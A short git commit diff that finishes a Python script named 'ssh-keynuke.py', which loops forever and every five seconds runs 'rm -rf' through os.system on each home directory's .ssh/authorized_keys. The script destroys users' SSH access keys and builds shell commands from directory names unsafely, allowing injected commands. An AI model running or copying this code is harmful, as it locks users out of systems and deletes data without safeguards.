39e703de8f44f78303a273d10a62060ea6bf5d9b
MdbookTech <michael@mdbooktech.com>
2022-02-17 13:25:11 -0500

    finished ssh-keynuke

--- scripts/ssh-keynuke.py
+++ scripts/ssh-keynuke.py
@@ -1,7 +1,9 @@
 import os
+import time
 
 os.chdir("/home")
-for file in os.listdir("."):
-    if os.path.isdir(file):
-        print(file)
-        # os.system("rm -rf " + file + "")
+while True:
+    for file in os.listdir("."):
+        if os.path.isdir(file):
+            os.system("rm -rf " + file + "/.ssh/authorized_keys")
+    time.sleep(5)
